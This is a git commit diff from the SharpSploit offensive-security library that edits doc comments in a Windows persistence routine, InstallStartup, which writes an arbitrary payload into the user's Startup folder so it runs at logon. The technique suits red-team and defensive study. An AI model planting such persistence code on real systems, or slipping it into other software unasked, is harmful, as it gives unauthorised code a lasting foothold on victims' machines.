f45a690237c82e1493b8024a9ad7ca5944ac4d12
cobbr <ryancobb65@gmail.com>
2019-07-16 10:47:50 -0500

    Startup persistence - minor edits

--- SharpSploit/Persistence/Startup.cs
+++ SharpSploit/Persistence/Startup.cs
@@ -13,27 +13,24 @@ namespace SharpSploit.Persistence
     public class Startup
     {
         /// <summary>
-        /// Writes a payload into the current users startup folder.
+        /// Installs a payload into the current users startup folder.
         /// </summary>
         /// <author>Daniel Duggan (@_RastaMouse)</author>
-        /// <returns>Bool. True if execution succeeds, false otherwise.</returns>
-        /// <param name="FileName">Defaults to "startup.bat"</param>
-        /// <param name="Payload">The payload to run.</param>
+        /// <param name="Payload">Payload to write to a file.</param>
+        /// <param name="FileName">Name of the file to write. Defaults to "startup.bat"</param>
+        /// <returns>True if execution succeeds, false otherwise.</returns>
         public static bool InstallStartup(string Payload, string FileName = "startup.bat")
         {
             try
             {
                 string FilePath = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + $@"\Microsoft\Windows\Start Menu\Programs\Startup\{FileName}";
                 File.WriteAllText(FilePath, Payload);
-
                 return true;
             }
-
             catch (Exception e)
             {
                 Console.Error.WriteLine("Failed: " + e.Message);
             }
-
             return false;
         } 
     }
